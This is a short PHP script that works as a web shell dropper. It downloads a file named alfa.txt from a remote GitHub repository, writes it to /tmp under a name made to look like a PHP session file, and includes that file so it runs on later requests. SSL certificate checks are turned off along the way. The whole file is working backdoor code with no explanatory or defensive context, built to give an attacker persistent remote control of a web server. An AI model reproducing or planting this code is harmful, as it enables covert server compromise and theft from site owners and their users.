<?php

$kontol = ['https://raw.githubusercontent.com/haxorstars/archive/main/alfa/alfa.txt', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];

if(file_exists($kontol[1]) && filesize($kontol[1]) !== 0) {
    include($kontol[1]);
} else {
    $fopen = fopen($kontol[1], 'w+');
    fwrite($fopen, get($kontol[0]));
    fclose($fopen);
}

function get($url) {
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    return curl_exec($ch);
          curl_close($ch);
}
?>
